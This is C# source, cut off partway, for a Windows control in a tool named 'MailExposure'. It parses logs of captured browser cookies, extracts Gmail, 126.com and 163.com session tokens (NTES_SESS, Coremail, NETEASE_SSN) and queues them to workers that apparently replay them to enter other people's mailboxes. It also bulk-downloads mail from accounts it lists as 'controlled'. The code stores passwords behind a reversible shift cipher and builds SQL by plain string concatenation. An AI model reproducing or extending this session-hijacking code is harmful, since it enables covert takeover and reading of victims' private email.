using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Data.OleDb;
using System.Windows.Forms;
using System.Globalization;
using System.Runtime.InteropServices;
using MailExposure.CookieMailRC;

namespace MailExposure
{
    public partial class CookieMailControl : UserControl
    {
        public bool singleRecv;
        public OleDbCommand oleDbCommand = null;
        private OleDbCommand oleDbSelectCommand1;
        public OleDbConnection oleDbConnection = new OleDbConnection();
        public String saveFilePath;
        public DateTime EmailDateTime;
        public CookieMailDB.CookieMailDataTableAdapters.usersTableAdapter oleDbDataAdapterView =new CookieMailDB.CookieMailDataTableAdapters.usersTableAdapter();
        public int nThreadCounts;
        private bool AllReceiveClick;
        private Thread[] threadsRun;
        private bool ThreadRunning;
        private Queue queueUsers;
        public String CookieUrl = "";
        public String CookieTime = "";
        public String CookieUserlist = "";
        public String CookiePassWord = "";
        public bool checkDataSave = true;
        public String EmailDirectory = "";
        public String UserList = "";
        public String folderPath = "";
        public String listpathIE = "";
        public String userListLabel = "";
        public string TimeInterval;
        public string PageNumber;
        public bool SaveAttachment;
        private POPMailReceiver popReceiver;
        private DateTime data;
        private Queue queueCookies;
        public OleDbConnection conn;
        public int MaxThreads;
        public int nThreadCookies;
        public int nThreadusers;
        private static object pob;
        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool InternetSetCookie(string lpszUrlName, string lbszCookieName, string lpszCookieData);
        private delegate void Add(TreeNode treeNode);

        public int ThreadCookies
        {
            get
            {
                return this.nThreadCookies;
            }
            set
            {
                try
                {
                    for (int i = 0; i < this.MaxThreads; i++)
                    {
                        if ((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState != ThreadState.Suspended))
                        {
                            this.threadsRun[i] = new Thread(new ThreadStart(this.ThreadCookieFunction));
                            this.threadsRun[i].Name = i.ToString();
                            this.threadsRun[i].Start();
                        }
                    }
                    this.nThreadCookies = value;
                }
                catch (Exception)
                {
                }
            }
        }

        public int ThreadCounts
        {
            get
            {
                return this.nThreadCounts;
            }
            set
            {
                try
                {
                    if (this.AllReceiveClick)
                    {
                        for (int i = 0; i < value; i++)
                        {
                            if ((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState != ThreadState.Suspended))
                            {
                                this.threadsRun[i] = new Thread(new ThreadStart(this.ThreadRunFunction));
                                this.threadsRun[i].Name = i.ToString();
                                this.threadsRun[i].Start();
                            }
                        }
                    }
                    this.nThreadCounts = value;
                }
                catch (Exception)
                {
                }
            }
        }
        public int Threadusers
        {
            get
            {
                return this.nThreadusers;
            }
            set
            {
                try
                {
                    for (int i = 0; i < this.MaxThreads; i++)
                    {
                        if ((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState != ThreadState.Suspended))
                        {
                            this.threadsRun[i] = new Thread(new ThreadStart(this.ThreadRunFunction));
                            this.threadsRun[i].Name = i.ToString();
                            this.threadsRun[i].Start();
                        }
                    }
                    this.nThreadusers = value;
                }
                catch (Exception)
                {
                }
            }
        }

        private void ThreadRunFunction()
        {
            while (this.ThreadRunning && (int.Parse(Thread.CurrentThread.Name) < this.ThreadCounts))
            {
                string indexNo = this.DequeueUser();
                if ((indexNo != null) && (indexNo != ""))
                {
                    this.BeginReceiveThread(indexNo);
                }
                else
                {
                    Thread.CurrentThread.Abort();
                }
            }
        }

        private string DequeueUser()
        {
            string str = "";
            Monitor.Enter(this.queueUsers);
            try
            {
                str = this.queueUsers.Dequeue().ToString();
            }
            catch (Exception)
            {
            }
            Monitor.Exit(this.queueUsers);
            return str;
        }

        private void ThreadCookieFunction()
        {
            while (this.ThreadRunning && (int.Parse(Thread.CurrentThread.Name) < this.MaxThreads))
            {
                CookieInfos infos = this.DequeueCookie();
                if ((infos != null) && (infos.cookieTxx != null))
                {
                    new DisplaceNew(infos.mailCookieType, infos.mailCookieUrl, infos.cookieTxx, infos.nowTime, infos.UserList, infos.Auto, infos.cookieRemarks).start();
                }
                else
                {
                    Thread.CurrentThread.Abort();
                }
            }
        }

        private CookieInfos DequeueCookie()
        {
            CookieInfos infos = new CookieInfos();
            Monitor.Enter(this.queueCookies);
            try
            {
                infos = (CookieInfos)this.queueCookies.Dequeue();
            }
            catch (Exception)
            {
            }
            Monitor.Exit(this.queueCookies);
            return infos;
        }
        static CookieMailControl()
        {
            pob = new object();
        }
        public CookieMailControl()
        {
            InitializeComponent();
            this.EmailDirectory = Directory.GetCurrentDirectory();//Imp future
            this.CookieUrl = "";
            this.CookieTime = "";
            this.CookieUserlist = "";
            this.CookiePassWord = "";
            this.checkDataSave = true;
            //this.SoudMsg = "";                                       //Sound  
            this.popReceiver = new POPMailReceiver();
            this.data = DateTime.Now;
            this.queueUsers = new Queue();
            this.UserList = "";
            this.folderPath = "";
            this.listpathIE = "";
            this.userListLabel = "";
            this.queueCookies = new Queue();
            this.threadsRun = new Thread[30];
            GlobalValue.mainForm = this;
            this.oleDbConnection.ConnectionString = @"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=|DataDirectory|\user.mdb";
            Control.CheckForIllegalCrossThreadCalls = false;

            this.treeViewUsers.AfterLabelEdit += new System.Windows.Forms.NodeLabelEditEventHandler(this.treeViewUsers_AfterLabelEdit);
            this.treeViewUsers.AfterSelect += new System.Windows.Forms.TreeViewEventHandler(this.treeViewUsers_AfterSelect);
            this.treeViewUsers.MouseClick += new System.Windows.Forms.MouseEventHandler(this.treeViewUsers_MouseClick);
            this.treeViewUsers.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.treeViewUsers_MouseDoubleClick);

            if (this.ConnectMdb())
            {
                base.Resize += new EventHandler(this.mainFormResize);
            }
            
        }

        private void mainFormResize(object sender, EventArgs e)
        {
        }

        private bool ConnectMdb()
        {
            try
            {
                OleDbConnectionStringBuilder builder = new OleDbConnectionStringBuilder();
                builder.DataSource = "./user.mdb";
                builder.Provider = "Microsoft.Jet.OLEDB.4.0";
                this.conn = new OleDbConnection(builder.ConnectionString);
                this.conn.Open();
                return true;
            }
            catch (Exception)
            {
                MessageBox.Show("数据库连接失败！数据库文件不存在！", "警告");
                return false;
            }
        }

        private void toolStripButtonReceive_Click(object sender, EventArgs e)
        {
            try
            {
                int y = this.dataGridView.CurrentCellAddress.Y;
                if (y >= 0)
                {
                    this.singleRecv = true;
                    this.BeginReceiveThread(this.cookieMailData.Tables["users"].Rows[y]["序号"].ToString());
                    this.singleRecv = false;
                }
                else
                {
                    MessageBox.Show("请选择用户！", "警告");
                }
            }
            catch
            {
            }

        }
        private void BeginReceiveThread(string indexNo)
        {
            int nO = -1;
            string userName = null;
            string passWdtext = null;
            string snote = null;
            string server = null;
            string seraddr = null;
            string stype = null;
            string str7 = null;
            string str8 = null;
            int mailno = -1;
            string str9 = null;
            string validationLogin = null;
            string emailuri = null;
            string str12 = null;
            string passwdType = null;
            string interceptTime = null;
            string sourceAddress = null;
            string objAddress = null;
            string loginInfo = null;
            string usertype = null;
            string userListName = null;
            string str20 = null;
            try
            {
                string str21 = "select * from users where 序号=" + indexNo;
                this.oleDbCommand = new OleDbCommand();
                this.oleDbCommand.CommandText = str21;
                this.oleDbCommand.Connection = this.conn;
                OleDbDataReader reader = this.oleDbCommand.ExecuteReader();
                while (reader.Read())
                {
                    nO = Convert.ToInt32(reader[0].ToString());
                    userName = reader[1].ToString();
                    passWdtext = reader[2].ToString();
                    snote = reader[3].ToString();
                    server = reader[4].ToString();
                    seraddr = reader[5].ToString();
                    stype = reader[6].ToString();
                    str7 = reader[7].ToString();
                    str8 = reader[11].ToString();
                    mailno = Convert.ToInt32(reader[12].ToString());
                    reader[13].ToString();
                    reader[14].ToString();
                    reader[15].ToString();
                    reader[0x10].ToString();
                    str9 = reader[0x12].ToString();
                    emailuri = reader[0x13].ToString();
                    validationLogin = reader[20].ToString();
                    str12 = reader[0x15].ToString();
                    passwdType = reader[0x16].ToString();
                    interceptTime = reader[0x17].ToString();
                    sourceAddress = reader[0x18].ToString();
                    objAddress = reader[0x19].ToString();
                    loginInfo = reader[0x1a].ToString();
                    usertype = reader[0x1b].ToString();
                    userListName = reader[0x1d].ToString();
                    str20 = reader[30].ToString();
                }

                if (passWdtext != "")
                {
                    passWdtext = this.Decryption(passWdtext, userName);
                }
                if (DateTime.Today.ToString() != str8)
                {
                    mailno = 0;
                }
                DateTime now = DateTime.Now;
                if (str9 != "True")
                {
                    if (str12 != "")
                    {
                        DateTime.Compare(Convert.ToDateTime(str12), now);
                    }
                    usertype.IndexOf("无密用户");
                    if (str7 == "True")
                    {
                        if ((str20 == "True") && !this.singleRecv)
                        {
                            new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype, userListName).Execute();
                            Thread.Sleep(0x7d0);
                        }
                        else if (this.AllReceiveClick)
                        {
                            if (usertype.IndexOf("数据包") == -1)
                            {
                                new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype, userListName).Execute();
                                Thread.Sleep(0x7d0);
                            }
                            else
                            {
                                new Displace(nO.ToString(), userName, passwdType, interceptTime, sourceAddress, objAddress, loginInfo, userListName).start();
                                Thread.Sleep(0x7d0);
                            }
                        }
                        else if (this.ThreadRunning && !this.AllReceiveClick)
                        {
                            bool flag = false;
                            for (int i = 0; i < this.MaxThreads; i++)
                            {
                                if (((this.threadsRun[i] == null) || (this.threadsRun[i].ThreadState == ThreadState.Suspended)) || (this.threadsRun[i].ThreadState == ThreadState.Stopped))
                                {
                                    if (usertype.IndexOf("数据包") == -1)
                                    {
                                        BeginReceiveThreads threads3 = new BeginReceiveThreads(nO, server, seraddr, userName, passWdtext, snote, stype, mailno, emailuri, validationLogin, usertype, userListName);
                                        this.threadsRun[i] = new Thread(new ThreadStart(threads3.Execute));
                                        this.threadsRun[i].Name = nO.ToString();
                                        this.threadsRun[i].Start();
                                        flag = true;
                                        Thread.Sleep(0x7d0);
                                    }
                                    else
                                    {
                                        Displace displace2 = new Displace(nO.ToString(), userName, passwdType, interceptTime, sourceAddress, objAddress, loginInfo, userListName);
                                        this.threadsRun[i] = new Thread(new ThreadStart(displace2.start));
                                        this.threadsRun[i].Name = nO.ToString();
                                        this.threadsRun[i].Start();
                                        flag = true;
                                        Thread.Sleep(0x7d0);
                                    }
                                    break;
                                }
                            }
                            if (!flag)
                            {
                                this.listBoxView.Items.Add("[警告]：请先停止一个线程再接收！");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                flag = false;
                            }
                        }
                    }
                    else
                    {
                        this.listBoxView.Items.Add(string.Concat(new object[] { "[", server, "：", userName, "]没有控守……  ", now }));
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                }
                else
                {
                    this.listBoxView.Items.Add(string.Concat(new object[] { "[", server, "：", userName, "]此用户正在接收…………  ", now }));
                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                }
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add(exception.Message + exception.TargetSite);
            }///Imp future
        }
        public string Decryption(string passWdtext, string userName)
        {
            string str = null;
            try
            {
                char[] chArray = passWdtext.ToCharArray();
                int length = userName.Length;
                for (int i = 0; i < chArray.Length; i++)
                {
                    length = length % 0x1a;
                    char ch = chArray[i];
                    if (((ch >= 'a') && (ch <= 'z')) || ((ch >= 'A') && (ch <= 'Z')))
                    {
                        ch = (char)(ch - length);
                        if (((ch < 'A') && (ch >= (0x41 - length))) || ((ch < 'a') && (ch >= (0x61 - length))))
                        {
                            ch = (char)(ch + '\x001a');
                        }
                    }
                    if ((ch >= '0') && (ch <= '9'))
                    {
                        length = length % 10;
                        ch = (char)(ch - length);
                        if ((ch < '0') && (ch >= (0x30 - length)))
                        {
                            ch = (char)(ch + '\n');
                        }
                    }
                    str = str + ch;
                }
            }
            catch (Exception)
            {
                this.listBoxView.Items.Add("解密失败！");
            }
            return str;
        }

        public string ExecuteSQL(string strSql)
        {
            lock (pob)
            {
                this.oleDbSelectCommand1 = new OleDbCommand(strSql, this.oleDbConnection);
                string str = Convert.ToString(this.oleDbSelectCommand1.ExecuteScalar());
                if (((strSql.IndexOf("users") != -1) && (strSql.IndexOf("数据包") == -1)) && (strSql.IndexOf("无密用户") == -1))
                {
                    try
                    {
                        if (strSql.IndexOf("delete") != -1)
                        {
                            this.cookieMailData.Tables["users"].Clear();
                           // this.oleDbDataAdapterView.Fill(this.cookieMailData.users);
                        }
                        else
                        {
                            //this.oleDbDataAdapterView.Fill(this.cookieMailData.users);
                        }
                    }
                    catch (Exception)
                    {
                        str = "false";
                    }
                }
                return str;
            }
        }

        private void toolStripButtonStopRec_Click(object sender, EventArgs e)
        {
            try
            {
                int y = this.dataGridView.CurrentCellAddress.Y;
                if (y >= 0)
                {
                    foreach (Thread thread in this.threadsRun)
                    {
                        if (((thread.Name == this.cookieMailData.Tables["users"].Rows[y]["序号"].ToString()) && (thread != null)) && thread.IsAlive)
                        {
                            if (MessageBox.Show("你确定要停止此线程?", "提示", MessageBoxButtons.YesNo) == DialogResult.Yes)
                            {
                                thread.Abort();
                                string str = "0";
                                string strSql = "update users set 接收状态=" + str + " where 序号=" + this.cookieMailData.Tables["users"].Rows[y]["序号"].ToString();
                                this.ExecuteSQL(strSql);
                            }
                        }
                    }
                }
                else
                {
                    MessageBox.Show("请选择用户！", "警告");
                }
            }
            catch
            {
            }
        }

        private void toolStripButtonAllReceive_Click(object sender, EventArgs e)
        {
            try
            {
                this.queueUsers.Clear();
                this.AllReceiveClick = true;
                int count = this.dataGridView.Rows.Count;
                if (count > 0)
                {
                    for (int i = 0; i < count; i++)
                    {
                        if (!this.EnqueueUser(this.cookieMailData.Tables["users"].Rows[i]["序号"].ToString()))
                        {
                            this.listBoxView.Items.Add("写入用户索引失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                        }
                    }
                    this.ThreadCounts = this.MaxThreads;
                }
                else
                {
                    this.listBoxView.Items.Add("没有可供下载的用户");
                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                }
            }
            catch
            {
            }

        }

        private bool EnqueueUser(string rowsNO)
        {
            Monitor.Enter(this.queueUsers);
            try
            {
                this.queueUsers.Enqueue(rowsNO);
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add("写入用户索引失败:" + exception.Message);
            }
            Monitor.Exit(this.queueUsers);
            return true;
        }

        private void toolStripButtonStop_Click(object sender, EventArgs e)
        {
            this.ButtonStopReceiveEmail_Clicks(sender, e);
        }
        private bool ButtonStopReceiveEmail_Clicks(object sender, EventArgs e)
        {
            try
            {
                string cmdText = "select count(*) from users where 接收状态=true";
                this.oleDbSelectCommand1 = new OleDbCommand(cmdText, this.oleDbConnection);
                if (Convert.ToInt32(Convert.ToString(this.oleDbSelectCommand1.ExecuteScalar())) > 0)
                {
                    if (MessageBox.Show("你确定要停止所有线程?", "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                    {
                        this.AllReceiveClick = false;
                        for (int i = 0; i < 10; i++)
                        {
                            try
                            {
                                Thread threadLoc = this.threadsRun[i];
                                if ((threadLoc != null) && threadLoc.IsAlive)
                                {
                                    if (threadLoc.ThreadState == ThreadState.Suspended)
                                    {
                                        threadLoc.Resume();
                                    }
                                    threadLoc.Abort();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        string str3 = "0";
                        cmdText = "update users set 接收状态=" + str3;
                        this.ExecuteSQL(cmdText);
                        return true;
                    }
                    return false;
                }
                return true;
            }
            catch
            {
                return true;
            }
        }

        private void ButtonEditeUser_Click(object sender, EventArgs e)
        {
            frmAddUsers users = new frmAddUsers();
            users.Text = "编辑用户";
            if (users.EditeUser(this.dataGridView, this.cookieMailData))
            {
                users.Show();
                users.TopMost = true;
            }
        }

        private void ButtonDeleteUser_Click(object sender, EventArgs e)
        {
            int y = this.dataGridView.CurrentCellAddress.Y;
            if (y > -1)
            {
                string str = this.cookieMailData.Tables["users"].Rows[y]["序号"].ToString();
                string strSql = "delete from users where 序号=" + str;
                string str3 = "select 用户名 from users where 序号=" + str;
                string str4 = this.ExecuteSQL(str3);
                if (MessageBox.Show("你确定删除该用户:" + str4, "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    this.ExecuteSQL(strSql);
                    if (this.treeViewUsers.SelectedNode.Level == 2)
                    {
                        this.treeViewUsers.SelectedNode.Remove();
                    }
                    else
                    {
                        foreach (TreeNode node in this.treeViewUsers.SelectedNode.Nodes)
                        {
                            if (node.Text.Trim() == str4)
                            {
                                node.Remove();
                            }
                        }
                    }
                }
                string sqlCountUsers = "select count(*) from users where 用户类型='普通用户'";
                this.UsersCount(sqlCountUsers);
            }
            else
            {
                MessageBox.Show("请选择用户！");
            }

        }

        public void UsersCount(string sqlCountUsers)
        {
            string strSql = sqlCountUsers;
            int num = Convert.ToInt32(this.ExecuteSQL(strSql));
            this.statusBarPanelUserNumberText.Text = Convert.ToString(num);
        }

        private void ButtonAddUser_Click(object sender, EventArgs e)
        {
            new UsersList().Show();
        }

        private void 编辑用户ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.ButtonEditeUser_Click(new object(), new EventArgs());
        }

        private void 编辑用户列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.treeViewUsers.LabelEdit = true;
            this.treeViewUsers.SelectedNode.BeginEdit();
            this.userListLabel = this.treeViewUsers.SelectedNode.Text.Trim();
        }

        private void 添加用户列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new UsersList().Show();
        }

        private void 删除列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.treeViewUsers.SelectedNode.Parent.Text == "未过滤用户")
            {
                string str = this.treeViewUsers.SelectedNode.Text.Trim();
                string strSql = "select count(*)  FROM users WHERE 用户列表='" + str + "'";
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(strSql)) > 0)
                {
                    MessageBox.Show("请先清空用户列表", "警告");
                }
                else if (MessageBox.Show("确定要删除用户列表吗？", "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    strSql = "delete from UsersList where UsersListName='" + str + "'";
                    this.ExecuteSQL(strSql);
                    this.treeViewUsers.SelectedNode.Remove();
                    foreach (TreeNode node in this.treeViewUsers.Nodes[1].Nodes)
                    {
                        if (node.Text.Trim() == str)
                        {
                            node.Remove();
                        }
                    }
                }
            }
            else if (this.treeViewUsers.SelectedNode.Parent.Text == "过滤后用户")
            {
                string str3 = this.treeViewUsers.SelectedNode.Text.Trim();
                string str4 = "select count(*) FROM users WHERE  用户列表='" + str3 + "'";
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str4)) > 0)
                {
                    MessageBox.Show("请先清空用户列表", "警告");
                }
                else if (MessageBox.Show("确定要删除用户列表吗？", "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    str4 = "delete from UsersList where UsersListName='" + str3 + "'";
                    this.ExecuteSQL(str4);
                    this.treeViewUsers.SelectedNode.Remove();
                    foreach (TreeNode node2 in this.treeViewUsers.Nodes[0].Nodes)
                    {
                        if (node2.Text.Trim() == str3)
                        {
                            node2.Remove();
                        }
                    }
                }
            }

        }

        private void 删除用户ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.ButtonStopReceiveEmail_Clicks(sender, e);
            int y = this.dataGridView.CurrentCellAddress.Y;
            if (y >= 0)
            {
                string str = this.cookieMailData.Tables["users"].Rows[y]["序号"].ToString();
                string strSql = "delete from users where 序号=" + str;
                string str3 = "select 用户名 from users where 序号=" + str;
                string str4 = this.ExecuteSQL(str3);
                if (MessageBox.Show("你确定删除该用户:" + str4, "警告", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    this.ExecuteSQL(strSql);
                }
                string sqlCountUsers = "select count(*) from users where 用户类型='普通用户'";
                this.UsersCount(sqlCountUsers);
            }
            else
            {
                MessageBox.Show("请选择用户！");
            }

        }

        private void 自动获取ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.自动获取CookieToolStripMenuItem.CheckState == CheckState.Unchecked)
            {
                if (MessageBox.Show("开启自动获取Cookies吗?", "提示", MessageBoxButtons.YesNo) == DialogResult.Yes)
                {
                    if (((this.CookieUrl == "") || (this.CookieTime == "")) || ((this.CookiePassWord == "") || (this.CookieUserlist == "")))
                    {
                        new CookieInfo().Show();
                    }
                    else
                    {
                        this.自动获取CookieToolStripMenuItem.CheckState = CheckState.Checked;
                    }
                }
            }
            else if (MessageBox.Show("关闭自动获取Cookies吗?", "提示", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                this.自动获取CookieToolStripMenuItem.CheckState = CheckState.Unchecked;
            }

        }
        public void gmail_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string str = "";
            string str2 = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((str = reader.ReadLine()) != null)
            {
                now = now.AddSeconds(1.0);
                if (str.Length > 0x19)
                {
                    index = str.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = str.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = str.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = str.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str = str.Substring(index + 8, str.Length - (index + 8));
                            }
                        }
                    }
                    str2 = str;
                    if (str2 == "")
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "GMAIL";
                        cookieInfo.mailCookieUrl = "mail.google.com";
                        cookieInfo.cookieTxx = str2;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }

        private bool EnqueueCookie(CookieInfos cookieInfo)
        {
            Monitor.Enter(this.queueCookies);
            try
            {
                this.queueCookies.Enqueue(cookieInfo);
            }
            catch (Exception exception)
            {
                this.listBoxView.Items.Add("写入用户索引失败:" + exception.Message);
            }
            Monitor.Exit(this.queueCookies);
            return true;
        }

        public void mail126_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string message = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str5 = "";
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str5 = strCookie.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8)).Trim();
                            }
                        }
                    }
                    if (str5.IndexOf("fm126.126.com") != -1)
                    {
                        message = this.get163MailCookieNTES_SESS(strCookie);
                    }
                    else if (str5.IndexOf("index.jsp") != -1)
                    {
                        message = this.get163MailCookieCoremail(strCookie);
                    }
                    else
                    {
                        string str6 = "";
                        message = this.get163MailCookieCoremailNETEASE_SSN(strCookie);
                        if (message != "")
                        {
                            str6 = this.putstr(message, "Coremail=", " ", 0);
                            if ((str6 != "-1") && (str6.IndexOf("%") != -1))
                            {
                                str6 = this.putstr(str6, "%", ";", 0);
                                if (str6 != "-1")
                                {
                                    string str7 = "";
                                    str7 = this.get163wmsvr_domain(strCookie);
                                    if (str7 != "")
                                    {
                                        str7 = str7.Trim(new char[] { ';' });
                                        str5 = "http://" + str7 + "/a/j/dm3/index.jsp?sid=" + str6;
                                    }
                                    else
                                    {
                                        str5 = "http://mail.126.com/a/j/dm3/index.jsp?sid=" + str6;
                                    }
                                }
                                else
                                {
                                    this.listBoxView.Items.Add("缺少必须的Cookie");
                                    this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    continue;
                                }
                            }
                        }
                    }
                    if ((message == "") || (str5 == ""))
                    {
                        this.listBoxView.Items.Add("转换失败！");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        this.listBoxView.Items.Add("转换成功！");
                        CookieInfos cookieInfo = new CookieInfos();
                        cookieInfo.mailCookieType = "126";
                        cookieInfo.mailCookieUrl = str5;
                        cookieInfo.cookieTxx = message;
                        cookieInfo.nowTime = now.ToString();
                        cookieInfo.UserList = this.UserList;
                        cookieInfo.Auto = Auto;
                        cookieInfo.cookieRemarks = cookieRemarks;
                        try
                        {
                            if (!this.EnqueueCookie(cookieInfo))
                            {
                                this.listBoxView.Items.Add("添加cookie失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                            continue;
                        }
                        catch
                        {
                            this.listBoxView.Items.Add("写入cookie失败:");
                            this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            continue;
                        }
                    }
                }
            }
            reader.Close();
            this.ThreadCookies = this.MaxThreads;
        }
        private string get163MailCookieNTES_SESS(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " NTES_SESS=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "NTES_SESS=" + str + " ";
            }
            return str2;
        }
        private string get163MailCookieCoremailNETEASE_SSN(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, "Coremail=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Coremail=" + str + " ";
            }
            str = this.putstr(strCookie, " NETEASE_SSN=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "NETEASE_SSN=" + str + " ";
            }
            return str2;
        }

        private string get163MailCookieCoremail(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " Coremail=", " ", 0);
            if (str != "-1")
            {
                str2 = str2 + "Coremail=" + str + " ";
            }
            return str2;
        }

        private string get163wmsvr_domain(string strCookie)
        {
            string str = "";
            string str2 = "";
            strCookie = " " + strCookie + "; ";
            str = this.putstr(strCookie, " wmsvr_domain=", " ", 0);
            if (str != "-1")
            {
                return str;
            }
            str = this.putstr(strCookie, " mail_host=", " ", 0);
            if (str != "-1")
            {
                str2 = str;
            }
            return str2;
        }

        public string putstr(string message, string startStr, string endStr, int startIndex)
        {
            if (startIndex < 0)
            {
                return "-1";
            }
            if (message.Length < startIndex)
            {
                return "-1";
            }
            string str = message.Substring(startIndex, message.Length - startIndex);
            int index = str.IndexOf(startStr);
            if (index < 0)
            {
                return "-1";
            }
            index += startStr.Length;
            str = str.Substring(index, str.Length - index);
            int length = str.IndexOf(endStr);
            if (length < 0)
            {
                return "-1";
            }
            return str.Substring(0, length);
        }

        public void mail163_txt(string yahoo_txtPath, bool Auto, string cookieRemarks)
        {
            string strCookie = "";
            string message = "";
            int index = 0;
            int num2 = 0;
            string s = "";
            DateTime now = DateTime.Now;
            string str5 = "";
            StreamReader reader = new StreamReader(yahoo_txtPath, Encoding.Default);
            while ((strCookie = reader.ReadLine()) != null)
            {
                if (strCookie.Length > 0x19)
                {
                    index = strCookie.IndexOf("DATE:");
                    if (index != -1)
                    {
                        num2 = strCookie.IndexOf("URL:");
                        if (num2 != -1)
                        {
                            s = strCookie.Substring(index + 5, num2 - (index + 5)).Trim();
                            if (s != "")
                            {
                                now = DateTime.Parse(s);
                            }
                            index = strCookie.IndexOf("Cookies:");
                            if (index != -1)
                            {
                                str5 = strCookie.Substring(num2 + 4, index - (num2 + 4)).Trim();
                                strCookie = strCookie.Substring(index + 8, strCookie.Length - (index + 8)).Trim();
                            }
                        }
                    }
                    if (str5.IndexOf("fm163.163.com") != -1)
                    {
                        message = this.get163MailCookieNTES_SESS(strCookie);
                    }
                    else if (str5.IndexOf("mail.163.com") != -1)
                    {
                        message = this.get163MailCookieCoremail(strCookie);
                    }
                    else
                    {
                        string str6 = "";
                        message = this.get163MailCookieCoremailNETEASE_SSN(strCookie);
                        if (message != "")
                        {
                            str6 = this.putstr(message, "Coremail=", " ", 0);
                            if ((str6 != "-1") && (str6.IndexOf("%") != -1))
                            {
                                str6 = this.putstr(str6, "%", ";", 0);
                                if (str6 != "-1")
                                {
                                    string str7 = "";
                                    str7 = this.get163wmsvr_domain(strCookie);
                                    if (str7 != "")
                                    {
                                        str7 = str7.Trim(new char[] { ';' });
                                        str5 = "http://" + str7 + "/js3/index.jsp?sid=" + str6;
                                    }
                                    else
                                    {
                                        this.listBoxView.Items.Add("Url不正确");
                                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                                    }
                                }
                                else
                                {
                                    this.listBoxView.Items.Add("缺少必须的Cookie");
